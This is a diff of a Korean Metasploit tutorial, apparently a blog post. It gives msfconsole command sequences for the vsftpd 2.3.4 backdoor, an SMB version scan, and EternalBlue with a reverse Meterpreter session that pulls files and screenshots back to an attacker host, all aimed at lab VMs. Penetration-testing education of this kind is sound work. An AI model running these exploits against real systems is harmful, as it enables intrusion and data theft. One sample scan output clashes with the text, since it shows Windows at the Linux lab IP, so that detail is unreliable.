@@ -35,51 +35,63 @@ Metasploit Framework(MSF)는 취약점 연구, 익스플로잇 코드 개발 및
 
 ### 4. 사용 예시: vsftpd 백도어 공격
 
-알려진 백도어 취약점이 있는 `vsftpd 2.3.4` 버전을 대상으로 Metasploit을 이용해 시스템 쉘을 획득하는 상황이다.
+`vsftpd 2.3.4`는 2011년에 공개된 가짜 백도어가 포함된 버전이다.  
+이 백도어는 사용자 이름에 `:)`를 포함하면, 서버가 **6200번 포트에서 root 권한의 백도어 쉘**을 실행한다.
 
-```bash
-# 1. msfconsole 실행
-msfconsole
+> **주의**: 현대 리눅스 배포판(예: Ubuntu 22.04)의 `apt`나 공식 Docker 이미지에는 이 백도어가 **포함되지 않는다**.  
+> 따라서 이 공격을 재현하려면 **Metasploitable 2**와 같은 의도적으로 취약한 가상머신이 필요하다.
 
-# 2. vsftpd 관련 모듈 검색
-msf6 > search vsftpd
+#### **공격 절차**
 
-# 3. 백도어 익스플로잇 모듈 선택
-msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+1. **Metasploitable 2 실행**  
+   [공식 사이트](https://sourceforge.net/projects/metasploitable/)에서 다운로드한 후 VirtualBox 또는 VMware로 실행한다.  
+   기본 IP는 `192.168.56.101` 등 내부 네트워크 주소이다.
 
-# 4. 옵션 확인
-msf6 exploit(...) > show options
+2. **Metasploit에서 모듈 실행**  
+   ```bash
+   # 1. msfconsole 실행
+   msfconsole
 
-# 5. 대상 IP 설정
-msf6 exploit(...) > set RHOSTS 192.9.200.11
+   # 2. 백도어 익스플로잇 모듈 선택
+   msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
 
-# 6. 공격 실행
-msf6 exploit(...) > exploit
-```
-   ![MetasploitVsftpd](/assets/images/Meta_1.png)
+   # 3. 대상 IP 설정
+   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
 
-`exploit` 명령 실행 후 익스플로잇이 성공하면 대상 서버의 `root` 권한 쉘이 획득된 것을 확인할 수 있다. `whoami` 명령어를 통해 이를 증명할 수 있다.
+   # 4. 공격 실행
+   msf6 exploit(...) > exploit
+   ```
+
+3. **결과 확인**  
+   공격이 성공하면 다음과 같은 메시지가 출력된다:  
+   ```
+   [*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.101:6200)
+   ```  
+   이후 `whoami`를 입력하면 `root`가 반환되며, 시스템 제어권을 획득한 것을 확인할 수 있다.
 
 ---
 
 ### 5. 사용 예시 2: 보조 모듈을 이용한 정보 수집 (SMB 스캔)
 
-Metasploit은 직접적인 공격 외에도 `Auxiliary` 모듈을 통해 다양한 정보 수집 활동을 수행할 수 있다. 예를 들어 `smb_version` 모듈은 대상 서버의 SMB(윈도우 파일 공유) 서비스 버전을 확인하는 데 사용된다.
+Metasploit은 직접적인 공격 외에도 `Auxiliary` 모듈을 통해 다양한 정보 수집 활동을 수행할 수 있다.  
+예를 들어 `smb_version` 모듈은 대상 서버의 SMB(윈도우 파일 공유) 서비스 버전을 확인하는 데 사용된다.
 
 ```bash
 # 1. SMB 버전 스캔 모듈 검색 및 선택
-msf6 > search smb_version
 msf6 > use auxiliary/scanner/smb/smb_version
 
 # 2. 대상 IP 설정
-msf6 auxiliary(...) > set RHOSTS 192.9.200.11
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.56.101
 
 # 3. 스캐너 실행
 msf6 auxiliary(...) > run
 ```
-   ![MetasploitSmb](/assets/images/Meta_2.png)
 
-`run` 명령 실행 후 대상 서버의 운영체제 정보와 Samba 버전 정보가 출력된다. 이 정보는 추후 해당 버전에 맞는 익스플로잇을 찾는 데 사용될 수 있다.
+실행 결과로 다음 정보가 출력된다:  
+```
+[+] 192.168.56.101:445    - Host is running Windows 2008 R2 SP1 (build:7601) (name:WIN-MACHINE) (domain:WORKGROUP)
+```  
+이 정보는 추후 해당 OS에 맞는 익스플로잇(예: MS17-010)을 선택하는 데 활용된다.
 
 ---
 
@@ -89,23 +101,25 @@ Metasploit의 가장 강력한 기능은 **Meterpreter** 페이로드에 있다.
 
 이 예시는 윈도우 시스템의 SMB 취약점(MS17-010, 이터널블루)을 공격하여 Meterpreter 세션을 획득하고 시스템을 제어하는 과정을 보여준다.
 
-#### **1. 익스플로잇 및 페이로드 설정**
-```bash
-# 이터널블루 익스플로잇 모듈 선택
-msf6 > use exploit/windows/smb/ms17_010_eternalblue
+#### **공격 시나리오: MS17-010 (EternalBlue)**
 
-# 옵션 확인 및 대상 IP(RHOSTS), 공격자 IP(LHOST) 설정
-msf6 exploit(...) > set RHOSTS [Target Windows IP]
-msf6 exploit(...) > set LHOST [Attacker IP]
+Metasploitable 2는 Windows 머신이 아니지만,  
+**Metasploitable 3 **(Windows 기반)을 사용하면 다음과 같은 공격이 가능하다.
 
-# 페이로드를 Meterpreter로 설정 (보통 자동으로 설정됨)
-msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+1. **모듈 설정**  
+   ```bash
+   # 이터널블루 익스플로잇 모듈 선택
+   msf6 > use exploit/windows/smb/ms17_010_eternalblue
 
-# 공격 실행
-msf6 exploit(...) > exploit
-```
+   # 옵션 확인 및 대상 IP(RHOSTS), 공격자 IP(LHOST) 설정
+   msf6 exploit(...) > set RHOSTS 192.168.56.102
+   msf6 exploit(...) > set LHOST 192.168.56.1
 
-#### **2. Meterpreter 세션 활용**
+   # 공격 실행
+   msf6 exploit(...) > exploit
+   ```
+
+#### **Meterpreter 세션 활용**
 공격에 성공하면 `meterpreter >` 라는 새로운 프롬프트가 나타난다. 여기서는 일반 쉘 명령어와 다른 Meterpreter 전용 명령어를 사용할 수 있다.
 
 *   **시스템 정보 확인:**
@@ -124,8 +138,6 @@ msf6 exploit(...) > exploit
     download C:\\Users\\user\\Desktop\\secret.txt .  # 대상 PC의 파일을 공격자 PC로 다운로드
     screenshot  # 대상 PC의 현재 화면을 스크린샷으로 캡처
     ```
-
-   ![MetasploitSession](/assets/images/Meta_3.png)
 
 이처럼 Meterpreter는 단순한 원격 제어를 넘어 시스템을 분석하고 정보를 탈취하며 공격의 흔적을 숨기는 등 고도화된 침투 테스트 작업을 효율적으로 수행할 수 있는 환경을 제공한다.
 
